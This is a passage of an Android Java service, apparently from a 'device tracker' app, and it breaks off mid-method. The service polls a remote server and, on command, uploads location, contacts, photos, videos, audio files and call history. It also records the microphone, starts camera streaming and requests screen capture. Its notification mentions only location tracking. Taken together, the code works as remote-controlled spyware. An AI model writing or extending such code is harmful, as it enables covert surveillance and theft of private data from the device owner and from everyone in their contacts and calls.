package com.example.devicetrackerapp.service;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.AssetFileDescriptor;
import android.media.MediaRecorder;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import java.io.File;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import com.example.devicetrackerapp.R;
import com.example.devicetrackerapp.activity.ScreenPermissionActivity;
import com.example.devicetrackerapp.api.ApiClient;
import com.example.devicetrackerapp.dto.ApiResponse;
import com.example.devicetrackerapp.dto.AudioFolderItem;
import com.example.devicetrackerapp.dto.AudioFolderPayload;
import com.example.devicetrackerapp.dto.AudioFolderSyncRequest;
import com.example.devicetrackerapp.dto.AudioItem;
import com.example.devicetrackerapp.dto.CallHistorySyncItemDTO;
import com.example.devicetrackerapp.dto.CallHistorySyncRequest;
import com.example.devicetrackerapp.dto.ContactItem;
import com.example.devicetrackerapp.dto.ImageFolderItem;
import com.example.devicetrackerapp.dto.ImageFolderSyncRequest;
import com.example.devicetrackerapp.dto.VideoFolderItem;
import com.example.devicetrackerapp.dto.VideoFolderPayload;
import com.example.devicetrackerapp.dto.VideoFolderSyncRequest;
import com.example.devicetrackerapp.dto.ContactPayload;
import com.example.devicetrackerapp.dto.TrackingConfigResponse;
import com.example.devicetrackerapp.dto.UpdateLocationRequest;
import com.example.devicetrackerapp.dto.VideoItem;
import com.example.devicetrackerapp.utils.AudioUtils;
import com.example.devicetrackerapp.utils.CallHistoryUtils;
import com.example.devicetrackerapp.utils.ContactUtils;
import com.example.devicetrackerapp.utils.DeviceUtils;
import com.example.devicetrackerapp.utils.InputStreamRequestBody;
import com.example.devicetrackerapp.utils.VideoUtils;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import androidx.core.content.ContextCompat;

import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;
import com.example.devicetrackerapp.dto.ImageItem;
import com.example.devicetrackerapp.utils.ImageUtils;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class DeviceTrackingService extends Service {

    private static final String TAG = "TrackingService";

    private static final int IMAGE_BATCH_SIZE = 2;
    private boolean folderSynced = false;
    private boolean imageUploading = false;

    private boolean audioUploading = false;
    private boolean micRecording = false;
    private boolean audioFolderSynced = false;
    private MediaRecorder mediaRecorder;
    private File micFile;
    private static final String MIC_FILE_NAME = "mic_recording.m4a";
    private static final int AUDIO_BATCH_SIZE = 5;
    private Handler handler;

    private boolean videoUploading = false;

    private boolean videoFolderSynced = false;

    private static final int VIDEO_BATCH_SIZE = 2;

    private String deviceId;

    private Runnable runnable;

    // Default 60 sec
    private long interval = 60000;
    private boolean screenPermissionRunning = false;

    private FusedLocationProviderClient locationClient;

    private String folder;
    private int limit = 20;
    private int offset = 0;
    private String order = "NEWEST";

    @Override
    public void onCreate() {

        super.onCreate();

        createNotification();

        locationClient = LocationServices.getFusedLocationProviderClient(this);

        deviceId = DeviceUtils.getDeviceId(this);

        handler = new Handler();

        startTracking();

    }

    private void startTracking() {

        runnable = new Runnable() {

            @Override
            public void run() {

                fetchTrackingConfig();

            }

        };

        handler.post(runnable);

    }

    private void getLocation() {

        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {

            Log.e(TAG, "Location Permission Missing");

            return;
        }

        locationClient
                .getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY,
                        null
                )
                .addOnSuccessListener(location -> {

                    if (location == null) {

                        Log.e(TAG, "Location NULL");

                        return;
                    }

                    double latitude = location.getLatitude();

                    double longitude = location.getLongitude();


                    Log.d(TAG, "LAT : " + latitude);

                    Log.d(TAG, "LNG : " + longitude);

                    updateServer(
                            latitude,
                            longitude
                    );

                });

    }

    private void updateServer(
            double latitude,
            double longitude) {

        UpdateLocationRequest request =
                new UpdateLocationRequest(
                        DeviceUtils.getDeviceId(this),
                        latitude,
                        longitude,
                        getBatteryLevel(),
                        null
                );

        ApiClient.getApiService()
                .updateDevice(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG, "Location Updated Successfully");

                        } else {

                            Log.e(TAG, "Update Failed");

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(TAG, "API Error", t);

                    }

                });

    }

    private int getBatteryLevel() {

        Intent batteryStatus =
                registerReceiver(
                        null,
                        new IntentFilter(Intent.ACTION_BATTERY_CHANGED)
                );

        if (batteryStatus == null) {

            return 0;

        }

        int level =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_LEVEL,
                        -1
                );

        int scale =
                batteryStatus.getIntExtra(
                        BatteryManager.EXTRA_SCALE,
                        -1
                );

        if (level == -1 || scale == -1) {

            return 0;

        }

        return (level * 100) / scale;

    }

    @Override
    public int onStartCommand(
            Intent intent,
            int flags,
            int startId) {

        return START_STICKY;

    }

    private void createNotification() {

        String channelId = "tracking_channel";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel =
                    new NotificationChannel(
                            channelId,
                            "Device Tracking",
                            NotificationManager.IMPORTANCE_LOW
                    );

            NotificationManager manager =
                    getSystemService(NotificationManager.class);

            manager.createNotificationChannel(channel);

        }

        Notification notification =
                new NotificationCompat.Builder(
                        this,
                        channelId
                )
                        .setContentTitle("Device Tracking Active")
                        .setContentText("Tracking location in background")
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .build();

        startForeground(
                1,
                notification
        );

    }

    @Override
    public void onDestroy() {

        super.onDestroy();

        if (handler != null && runnable != null) {

            handler.removeCallbacks(runnable);

        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

    private void fetchTrackingConfig() {

        String deviceId = DeviceUtils.getDeviceId(this);

        ApiClient.getApiService()
                .getTrackingConfig(deviceId)
                .enqueue(new Callback<ApiResponse<TrackingConfigResponse>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<TrackingConfigResponse>> call,
                            Response<ApiResponse<TrackingConfigResponse>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            TrackingConfigResponse config = response.body().getData();
                            Log.d(TAG,"================ CONFIG ================");
                            Log.d(TAG,"tracking="+config.getTrackingEnabled());
                            Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
                            Log.d(TAG,"refreshContacts="+config.getRefreshContacts());
                            Log.d(TAG,"refreshImages="+config.getRefreshImages());
                            Log.d(TAG,"imageBucket="+config.getImageBucketId());
                            Log.d(TAG,"refreshVideos="+config.getRefreshVideos());
                            Log.d(TAG,"refreshAudios="+config.getRefreshAudios());
                            Log.d(TAG,"refreshMic="+config.getRefreshMic());
                            Log.d(TAG,"refreshCamera="+config.getRefreshCamera());
                            Log.d(TAG,"========================================");

                            if (config != null) {

                                if (config.getTrackingInterval() != null
                                        && config.getTrackingInterval() > 0) {

                                    interval = config.getTrackingInterval() * 1000L;

                                } else {

                                    interval = 60000L;

                                }

                                Log.d(TAG, "Tracking : " + config.getTrackingEnabled());
                                Log.d(TAG, "Interval : " + interval);

                                // Location
                                if (Boolean.TRUE.equals(config.getTrackingEnabled())) {

                                    getLocation();

                                } else {

                                    Log.d(TAG, "Tracking Disabled");

                                }

                                // Contacts
                                Log.d(TAG,"contactsUploaded="+config.getContactsUploaded());
                                Log.d(TAG,"refreshContacts="+config.getRefreshContacts());

                                if (!Boolean.TRUE.equals(config.getContactsUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshContacts())) {

                                    Log.d(TAG,"uploadContacts() CALLED");
                                    uploadContacts();

                                } else {
                                    Log.d(TAG,"Contacts already uploaded. Skip.");
                                }

                               // Images
                                Log.d(TAG, "refreshImages = " + config.getRefreshImages());
                                Log.d(TAG, "imageUploading = " + imageUploading);
                                Log.d(TAG,"Bucket="+config.getImageBucketId());

                                if ((!Boolean.TRUE.equals(config.getImagesUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshImages()))
                                        && !imageUploading) {
                                    Log.d(TAG, "uploadImages() called");
                                    Log.d(TAG, "Folder = " + config.getImageBucketId());
                                    imageUploading = true;

                                    uploadImages(
                                            config.getImageBucketId(),
                                            config.getImageLimit() != null ? config.getImageLimit() : 4,
                                            config.getImageOffset() != null ? config.getImageOffset() : 0,
                                            config.getImageOrder() != null ? config.getImageOrder() : "NEWEST"
                                    );
                                }

                                //folder sync
                                Log.d(TAG, "===== BEFORE FOLDER SYNC =====");
                                Log.d(TAG, "folderSynced = " + folderSynced);

                                if (!folderSynced) {

                                    Log.d(TAG, "syncImageFolders() CALLED");

                                    syncImageFolders();

                                }

                                // Videos
                                Log.d(TAG, "refreshVideos = " + config.getRefreshVideos());
                                Log.d(TAG, "videoUploading = " + videoUploading);
                                Log.d(TAG, "Bucket = " + config.getVideoBucketId());

                                if ((!Boolean.TRUE.equals(config.getVideosUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshVideos()))
                                        && !videoUploading) {

                                    Log.d(TAG, "uploadVideos() called");
                                    Log.d(TAG, "Folder = " + config.getVideoBucketId());

                                    videoUploading = true;

                                    uploadVideos(
                                            config.getVideoBucketId(),
                                            config.getVideoLimit() != null ? config.getVideoLimit() : 4,
                                            config.getVideoOffset() != null ? config.getVideoOffset() : 0,
                                            config.getVideoOrder() != null ? config.getVideoOrder() : "NEWEST"
                                    );
                                }

                               // Folder Sync
                                Log.d(TAG, "===== BEFORE VIDEO FOLDER SYNC =====");
                                Log.d(TAG, "videoFolderSynced = " + videoFolderSynced);

                                if (!videoFolderSynced) {

                                    Log.d(TAG, "syncVideoFolders() CALLED");

                                    syncVideoFolders();

                                }

                                // Audios
                                Log.d(TAG, "refreshAudios = " + config.getRefreshAudios());
                                Log.d(TAG, "audioUploading = " + audioUploading);
                                Log.d(TAG,"audiosUploaded="+config.getAudiosUploaded());
                                Log.d(TAG,"micUploaded="+config.getMicUploaded());
                                Log.d(TAG,"micDuration="+config.getMicDuration());

                                if ((!Boolean.TRUE.equals(config.getAudiosUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshAudios()))
                                        && !audioUploading) {

                                    Log.d(TAG, "uploadAudios() called");

                                    audioUploading = true;

                                    uploadAudios(
                                            config.getAudioBucketId(),
                                            config.getAudioLimit() != null
                                                    ? config.getAudioLimit()
                                                    : 10,

                                            config.getAudioOffset() != null
                                                    ? config.getAudioOffset()
                                                    : 0,

                                            config.getAudioOrder() != null
                                                    ? config.getAudioOrder()
                                                    : "NEWEST"
                                    );

                                }

                                // Audio Folder Sync

                                Log.d(TAG, "===== BEFORE AUDIO FOLDER SYNC =====");
                                Log.d(TAG, "audioFolderSynced = " + audioFolderSynced);


                                if (!audioFolderSynced) {


                                    Log.d(TAG, "syncAudioFolders() CALLED");


                                    syncAudioFolders();

                                }

                                // Mic Recording
                                Log.d(TAG, "refreshMic = " + config.getRefreshMic());
                                Log.d(TAG, "micUploaded = " + config.getMicUploaded());

                                if ((!Boolean.TRUE.equals(config.getMicUploaded())
                                        || Boolean.TRUE.equals(config.getRefreshMic()))
                                        && !micRecording) {

                                    int duration =
                                            config.getMicDuration() != null
                                                    ? config.getMicDuration()
                                                    : 10;

                                    Log.d(TAG, "startMicRecording() called");
                                    Log.d(TAG, "Duration = " + duration + " sec");

                                    startMicRecording(duration);
                                }

                                // Camera
                                Log.d(TAG, "refreshCamera = " + config.getRefreshCamera());
                                Log.d(TAG, "cameraStreaming = " + config.getCameraStreaming());
                                Log.d(TAG, "cameraType = " + config.getCameraType());

                                if (Boolean.TRUE.equals(config.getRefreshCamera())) {

                                    ApiClient.getApiService()
                                            .cameraRequestReceived(deviceId)
                                            .enqueue(new Callback<ApiResponse<String>>() {

                                                @Override
                                                public void onResponse(
                                                        Call<ApiResponse<String>> call,
                                                        Response<ApiResponse<String>> response) {

                                                    if (response.isSuccessful()
                                                            && response.body() != null
                                                            && response.body().isSuccess()) {

                                                        Log.d(TAG, "Starting CameraForegroundService...");

                                                        Intent serviceIntent =
                                                                new Intent(
                                                                        DeviceTrackingService.this,
                                                                        CameraForegroundService.class
                                                                );

                                                        serviceIntent.putExtra("deviceId", deviceId);
                                                        serviceIntent.putExtra("cameraType", config.getCameraType());

                                                        ContextCompat.startForegroundService(
                                                                DeviceTrackingService.this,
                                                                serviceIntent
                                                        );

                                                    } else {

                                                        Log.e(TAG, "Camera Request Failed");

                                                        if (response.body() != null) {
                                                            Log.e(TAG, "Message : " + response.body().getMessage());
                                                        }

                                                    }

                                                }

                                                @Override
                                                public void onFailure(
                                                        Call<ApiResponse<String>> call,
                                                        Throwable t) {

                                                    Log.e(TAG, "Camera Request Failed", t);

                                                }

                                            });

                                }


                            // ================= CALL HISTORY =================

                                Log.d(TAG,
                                        "refreshCallHistory = "
                                                + config.getRefreshCallHistory());

                                if (Boolean.TRUE.equals(config.getRefreshCallHistory())) {

                                    Log.d(TAG,
                                            "========== CALL HISTORY REQUEST RECEIVED ==========");

                                    if (!hasPermission(Manifest.permission.READ_CALL_LOG)) {

                                        Log.e(TAG,
                                                "READ_CALL_LOG permission not granted");

                                    } else {

                                        try {

                                            LocalDate today = LocalDate.now();

                                            Log.d(TAG,
                                                    "Syncing Call History : "
                                                            + today
                                                            + " -> "
                                                            + today);

                                            syncCallHistory(
                                                    deviceId,
                                                    today,
                                                    today
                                            );

                                        } catch (Exception e) {

                                            Log.e(TAG,
                                                    "Call History Sync Error",
                                                    e);
                                        }
                                    }

                                } else {

                                    Log.d(TAG,
                                            "Call History sync not requested. Skip.");

                                }

                               // ================= Screen =================

                                Log.d(TAG,
                                        "refreshScreen=" + config.getRefreshScreen()
                                                + " status=" + config.getScreenStatus()
                                                + " screenPermissionRunning=" + screenPermissionRunning);

                                if (Boolean.TRUE.equals(config.getRefreshScreen())
                                        && !"STREAMING".equalsIgnoreCase(config.getScreenStatus())
                                        ) {

                                    ApiClient.getApiService()
                                            .screenRequestReceived(deviceId)
                                            .enqueue(new Callback<ApiResponse<String>>() {

                                                @Override
                                                public void onResponse(
                                                        Call<ApiResponse<String>> call,
                                                        Response<ApiResponse<String>> response) {

                                                    if (response.isSuccessful()
                                                            && response.body() != null
                                                            && response.body().isSuccess()) {

                                                        Log.d(TAG, "Starting ScreenPermissionActivity...");

                                                        screenPermissionRunning = true;

                                                        Intent intent =
                                                                new Intent(
                                                                        DeviceTrackingService.this,
                                                                        ScreenPermissionActivity.class
                                                                );

                                                        intent.putExtra("deviceId", deviceId);

                                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                                                        startActivity(intent);

                                                    } else {

                                                        Log.e(TAG, "Screen Request Failed");

                                                    }

                                                }

                                                @Override
                                                public void onFailure(
                                                        Call<ApiResponse<String>> call,
                                                        Throwable t) {

                                                    Log.e(TAG, "Screen Request Failed", t);

                                                }

                                            });

                                }



                            }

                        }

                        handler.postDelayed(runnable, interval);

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<TrackingConfigResponse>> call,
                            Throwable t) {

                        Log.e(TAG, "Config Error", t);

                        handler.postDelayed(runnable, interval);

                    }

                });

    }

    private boolean hasPermission(String permission) {

        return ActivityCompat.checkSelfPermission(
                this,
                permission
        ) == PackageManager.PERMISSION_GRANTED;

    }

    private void uploadContacts() {

        try {

            if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
                return;
            }

            List<ContactItem> contacts = ContactUtils.getContacts(this);

            if (contacts.size() > 5000) {
                Log.d(TAG, "Large Contact List : " + contacts.size());
            }

            if (contacts == null || contacts.isEmpty()) {
                Log.d(TAG, "No Contacts Found");
                return;
            }

            ContactPayload payload = new ContactPayload(
                    DeviceUtils.getDeviceId(this),
                    contacts
            );

            ApiClient.getApiService()
                    .saveContacts(payload)
                    .enqueue(new Callback<ApiResponse<String>>() {

                        @Override
                        public void onResponse(
                                Call<ApiResponse<String>> call,
                                Response<ApiResponse<String>> response) {

                            if (response.isSuccessful()
                                    && response.body() != null
                                    && response.body().isSuccess()) {

                                Log.d(TAG, "Contacts Uploaded Successfully");

                            } else {

                                Log.e(TAG,
                                        "Contact Upload Failed : "
                                                + response.code());
                            }
                        }

                        @Override
                        public void onFailure(
                                Call<ApiResponse<String>> call,
                                Throwable t) {

                            Log.e(TAG, "Contact Upload Error", t);

                        }
                    });

        } catch (Exception e) {

            Log.e(TAG, "Contact Upload Exception", e);

        }
    }

    private void uploadImages(String folder,
                              int limit,
                              int offset,
                              String order) {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissionGranted = hasPermission(Manifest.permission.READ_MEDIA_IMAGES);
            } else {
                permissionGranted = hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
            }

            if (!permissionGranted) {

                Log.e(TAG, "READ_MEDIA_IMAGES Permission Not Granted");
                imageUploading = false;

                // next cycle me retry hoga
                return;
            }

            if (folder == null || folder.trim().isEmpty()) {
                Log.d(TAG, "Bucket Id is NULL");
                imageUploading = false;
                return;
            }

            if (limit <= 0) {
                limit = 20;
            }

            if (offset < 0) {
                offset = 0;
            }

            if (order == null || order.trim().isEmpty()) {
                order = "NEWEST";
            }

            List<ImageItem> images =
                    ImageUtils.getImages(
                            this,
                            folder,
                            limit,
                            offset,
                            order
                    );

            if (images == null) {

                Log.d(TAG, "Image list is NULL");
                imageUploading = false;
                return;
            }

            Log.d(TAG, "================ IMAGE DEBUG ================");
            Log.d(TAG, "Folder : " + folder);
            Log.d(TAG, "Limit : " + limit);
            Log.d(TAG, "Offset : " + offset);
            Log.d(TAG, "Order : " + order);
            Log.d(TAG, "Images Found : " + images.size());

            for (ImageItem item : images) {
                Log.d(TAG, item.getImageName() + " -> " + item.getImageUri());
            }

            if (images.isEmpty()) {

                Log.d(TAG, "No Images Found For Bucket : " + folder);
                imageUploading = false;
                return;
            }

            uploadImageBatch(images, 0);

        } catch (Exception e) {

            imageUploading = false;
            Log.e(TAG, "uploadImages()", e);

        }
    }

    private void uploadImageBatch(List<ImageItem> images, int startIndex) {

        if (startIndex >= images.size()) {

            imageUploading = false;
            Log.d(TAG, "All Images Uploaded");
            return;
        }

        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );

        // Backend duplicate handle karega
        RequestBody clearOldBody =
                RequestBody.create(
                        "false",
                        MultipartBody.FORM
                );

        List<MultipartBody.Part> parts = new ArrayList<>();

        long totalBatchSize = 0;

        int endIndex = Math.min(
                startIndex + IMAGE_BATCH_SIZE,
                images.size()
        );

        for (int i = startIndex; i < endIndex; i++) {

            ImageItem item = images.get(i);

            Log.d(TAG, "Uploading : " + item.getImageName());
            Log.d(TAG, "Uri : " + item.getImageUri());

            try {

                AssetFileDescriptor afd =
                        getContentResolver().openAssetFileDescriptor(
                                item.getImageUri(),
                                "r"
                        );

                if (afd != null) {

                    long size = afd.getLength();
                    totalBatchSize += size;

                    Log.d(TAG,
                            "Image Size : "
                                    + item.getImageName()
                                    + " = "
                                    + (size / 1024)
                                    + " KB ("
                                    + String.format("%.2f", size / (1024.0 * 1024.0))
                                    + " MB)");

                    afd.close();
                }

                RequestBody requestBody =
                        new InputStreamRequestBody(
                                this,
                                item.getImageUri(),
                                MediaType.parse("image/*")
                        );

                MultipartBody.Part part =
                        MultipartBody.Part.createFormData(
                                "files",
                                item.getImageName(),
                                requestBody
                        );

                parts.add(part);

            } catch (Exception e) {

                Log.e(TAG,
                        "Image Read Error : " + item.getImageName(),
                        e);

            }
        }

        if (parts.isEmpty()) {

            uploadImageBatch(images, endIndex);
            return;
        }

        Log.d(TAG, "========== IMAGE UPLOAD ==========");
        Log.d(TAG, "Batch Size = " + parts.size());
        Log.d(TAG, "DeviceId = " + DeviceUtils.getDeviceId(this));
        Log.d(TAG, "ClearOld = false");

        Log.d(TAG,
                "Batch Total Size = "
                        + (totalBatchSize / 1024)
                        + " KB ("
                        + String.format("%.2f", totalBatchSize / (1024.0 * 1024.0))
                        + " MB)");

        ApiClient.getApiService()
                .uploadImages(
                        deviceBody,
                        clearOldBody,
                        parts
                )
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(Call<ApiResponse<String>> call,
                                           Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(TAG,
                                    "Uploaded Images : "
                                            + startIndex
                                            + " - "
                                            + (endIndex - 1));

                        } else {

                            Log.e(TAG, "Upload Failed");
                            Log.e(TAG, "HTTP Code = " + response.code());

                            if (response.errorBody() != null) {
                                try {
                                    Log.e(TAG, response.errorBody().string());
                                } catch (Exception ignored) {
                                }
                            }
                        }

                        uploadImageBatch(images, endIndex);
                    }

                    @Override
                    public void onFailure(Call<ApiResponse<String>> call,
                                          Throwable t) {

                        Log.e(TAG, "Upload Error", t);

                        uploadImageBatch(images, endIndex);
                    }
                });
    }
    private void syncImageFolders() {

        Log.d(TAG, "========== Folder Sync ==========");

        boolean permissionGranted;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            permissionGranted = ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED;

        } else {

            permissionGranted = ActivityCompat.checkSelfPermission(
                    this,
                    Manifest.permission.READ_EXTERNAL_STORAGE
            ) == PackageManager.PERMISSION_GRANTED;

        }

        if (!permissionGranted) {

            Log.d(TAG, "Image permission not granted. Folder sync skipped.");

            folderSynced = false;

            return;
        }

        List<ImageItem> images = ImageUtils.getImages(this);
        Log.d("IMAGE_FOLDER", "Total Images = " + images.size());

        List<ImageFolderItem> folders = ImageUtils.getImageFolders(this);

        Log.d(TAG, "DeviceId : " + DeviceUtils.getDeviceId(this));
        Log.d(TAG, "Folder Count : " + folders.size());

        for (ImageFolderItem item : folders) {

            Log.d(TAG,
                    "BucketId = " + item.getBucketId()
                            + " | Folder = " + item.getFolderName()
                            + " | Count = " + item.getImageCount());

        }

        ImageFolderSyncRequest request = new ImageFolderSyncRequest();

        request.setDeviceId(DeviceUtils.getDeviceId(this));
        request.setFolders(folders);

        Log.d(TAG, "Calling Folder Sync API...");

        ApiClient.getApiService()
                .syncImageFolders(request)
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(Call<ApiResponse<String>> call,
                                           Response<ApiResponse<String>> response) {

                        Log.d(TAG, "HTTP Code : " + response.code());

                        if (response.body() != null) {

                            Log.d(TAG, "Success : " + response.body().isSuccess());
                            Log.d(TAG, "Message : " + response.body().getMessage());

                        }

                        if (response.isSuccessful() && response.body() != null && response.body().isSuccess()) {

                            Log.d(TAG, "Folder Sync Success");
                            folderSynced = true;

                        } else {

                            try {

                                if (response.errorBody() != null) {

                                    Log.e(TAG,
                                            "Error Body : "
                                                    + response.errorBody().string());

                                }

                            } catch (Exception e) {

                                Log.e(TAG, "Error Reading ErrorBody", e);

                            }

                        }

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {
                        folderSynced = false;

                        Log.e(TAG, "Folder Sync API Failed", t);

                    }

                });

    }

    private void uploadVideos(
            String folder,
            int limit,
            int offset,
            String order) {

        try {

            boolean permissionGranted;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_MEDIA_VIDEO);

            } else {

                permissionGranted =
                        hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE);

            }

            if (!permissionGranted) {

                Log.e(TAG, "READ_MEDIA_VIDEO Permission Not Granted");

                videoUploading = false;

                return;

            }

            if (folder == null || folder.trim().isEmpty()) {

                Log.d(TAG, "Video Bucket Id is NULL");

                videoUploading = false;

                return;

            }

            if (limit <= 0) {

                limit = 20;

            }

            if (offset < 0) {

                offset = 0;

            }

            if (order == null || order.trim().isEmpty()) {

                order = "NEWEST";

            }

            List<VideoItem> videos =
                    VideoUtils.getVideos(
                            this,
                            folder,
                            limit,
                            offset,
                            order
                    );

            if (videos == null) {

                Log.d(TAG, "Video List is NULL");

                videoUploading = false;

                return;

            }

            Log.d(TAG, "============= VIDEO DEBUG =============");

            Log.d(TAG, "Folder : " + folder);

            Log.d(TAG, "Limit : " + limit);

            Log.d(TAG, "Offset : " + offset);

            Log.d(TAG, "Order : " + order);

            Log.d(TAG, "Videos Found : " + videos.size());

            for (VideoItem item : videos) {

                Log.d(TAG,
                        item.getName()
                                + " -> "
                                + item.getUri());

            }

            if (videos.isEmpty()) {

                Log.d(TAG,
                        "No Videos Found For Bucket : "
                                + folder);

                videoUploading = false;

                return;

            }

            uploadVideoBatch(videos, 0);

        } catch (Exception e) {

            videoUploading = false;

            Log.e(TAG, "uploadVideos()", e);

        }

    }

    private void uploadVideoBatch(
            List<VideoItem> videos,
            int startIndex) {

        if (startIndex >= videos.size()) {

            videoUploading = false;

            Log.d(TAG, "All Videos Uploaded");

            return;
        }

        RequestBody deviceBody =
                RequestBody.create(
                        DeviceUtils.getDeviceId(this),
                        MultipartBody.FORM
                );

        List<MultipartBody.Part> parts = new ArrayList<>();

        long totalBatchSize = 0;

        int endIndex = Math.min(
                startIndex + VIDEO_BATCH_SIZE,
                videos.size()
        );

        for (int i = startIndex; i < endIndex; i++) {

            VideoItem item = videos.get(i);

            Log.d(TAG, "Uploading : " + item.getName());
            Log.d(TAG, "Uri : " + item.getUri());

            try {

                AssetFileDescriptor afd =
                        getContentResolver().openAssetFileDescriptor(
                                item.getUri(),
                                "r"
                        );

                if (afd != null) {

                    long size = afd.getLength();

                    totalBatchSize += size;

                    Log.d(
                            TAG,
                            "Video Size : "
                                    + item.getName()
                                    + " = "
                                    + (size / 1024)
                                    + " KB ("
                                    + String.format("%.2f", size / (1024.0 * 1024.0))
                                    + " MB)"
                    );

                    afd.close();
                }

                String mimeType =
                        getContentResolver().getType(item.getUri());

                if (mimeType == null || mimeType.isEmpty()) {
                    mimeType = "video/mp4";
                }

                RequestBody requestBody =
                        new InputStreamRequestBody(
                                this,
                                item.getUri(),
                                MediaType.parse(mimeType)
                        );

                MultipartBody.Part part =
                        MultipartBody.Part.createFormData(
                                "files",
                                item.getName(),
                                requestBody
                        );

                parts.add(part);

            } catch (Exception e) {

                Log.e(
                        TAG,
                        "Video Read Error : " + item.getName(),
                        e
                );

            }

        }

        if (parts.isEmpty()) {

            uploadVideoBatch(videos, endIndex);

            return;

        }

        Log.d(TAG, "========== VIDEO UPLOAD ==========");
        Log.d(TAG, "Batch Size = " + parts.size());
        Log.d(TAG, "DeviceId = " + DeviceUtils.getDeviceId(this));

        Log.d(
                TAG,
                "Batch Total Size = "
                        + (totalBatchSize / 1024)
                        + " KB ("
                        + String.format("%.2f", totalBatchSize / (1024.0 * 1024.0))
                        + " MB)"
        );

        ApiClient.getApiService()
                .uploadVideos(
                        deviceBody,
                        parts
                )
                .enqueue(new Callback<ApiResponse<String>>() {

                    @Override
                    public void onResponse(
                            Call<ApiResponse<String>> call,
                            Response<ApiResponse<String>> response) {

                        if (response.isSuccessful()
                                && response.body() != null
                                && response.body().isSuccess()) {

                            Log.d(
                                    TAG,
                                    "Uploaded Videos : "
                                            + startIndex
                                            + " - "
                                            + (endIndex - 1)
                            );

                        } else {

                            Log.e(TAG, "Video Upload Failed");
                            Log.e(TAG, "HTTP Code = " + response.code());

                            try {

                                if (response.errorBody() != null) {

                                    Log.e(
                                            TAG,
                                            response.errorBody().string()
                                    );

                                }

                            } catch (Exception e) {

                                Log.e(TAG, "ErrorBody Read Failed", e);

                            }

                        }

                        uploadVideoBatch(videos, endIndex);

                    }

                    @Override
                    public void onFailure(
                            Call<ApiResponse<String>> call,
                            Throwable t) {

                        Log.e(TAG, "Video Upload Error", t);

                        uploadVideoBatch(videos, endIndex);

                    }

                });

    }
    private void syncVideoFolders() {

        Log.d(TAG, "========== VIDEO FOLDER SYNC ==========");

        boolean permissionGranted;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            permissionGranted =
                    ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.READ_MEDIA_VIDEO
                    ) == PackageManager.PERMISSION_GRANTED;

        } else {

            permissionGranted =
                    ActivityCompat.checkSelfPermission(
                            this,
                            Manifest.permission.READ_EXTERNAL_STORAGE
                    ) == PackageManager.PERMISSION_GRANTED;

        }

        if (!permissionGranted) {

            Log.d(TAG, "Video permission not granted. Folder sync skipped.");

            videoFolderSynced = false;

            return;

        }

        List<VideoItem> videos =
                VideoUtils.getVideos(
                        this,
                        null,
                        Integer.MAX_VALUE,
                        0,
                        "NEWEST"
                );

        Log.d(TAG, "Total Videos = " + videos.size());

        List<VideoFolderItem> folders =
                VideoUtils.getVideoFolders(this);

        Log.d(TAG, "DeviceId : " + DeviceUtils.getDeviceId(this));

        Log.d(TAG, "Folder Count : " + folders.size());

        for (VideoFolderItem item : folders) {

            Log.d(
                    TAG,
                    "BucketId = "
                            + item.getBucketId()
                            + " | Folder = "
                            + item.getFolderName()
                            + " | Count = "
                            + item.getVideoCount()
            );

        }

        VideoFolderSyncRequest request =
                new VideoFolderSyncRequest();

